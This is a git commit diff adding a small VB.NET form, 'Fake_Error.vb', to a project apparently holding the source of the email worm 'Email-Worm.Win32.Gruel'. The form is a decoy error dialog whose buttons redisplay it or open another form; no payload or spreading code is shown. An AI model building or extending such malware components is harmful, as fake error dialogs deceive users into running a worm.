4d5be3a57b220dbe7a9842aa3fd3991b92a4cb96
Timothy Iles <39615739+WindowsLogic@users.noreply.github.com>
2018-12-04 22:12:40 +0000

    Added source code.

---
+++ Email-Worm.Win32.Gruel/Email-Worm.Win32.Gruel/Fake_Error.vb
@@ -0,0 +1,13 @@
+﻿Public Class Fake_Error
+
+    Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click
+        Me.Hide()
+        Me.Show()
+    End Sub
+
+    Private Sub Button2_Click(sender As System.Object, e As System.EventArgs) Handles Button2.Click
+        Well_Shit.Show()
+        Me.Close()
+    End Sub
+
+End Class
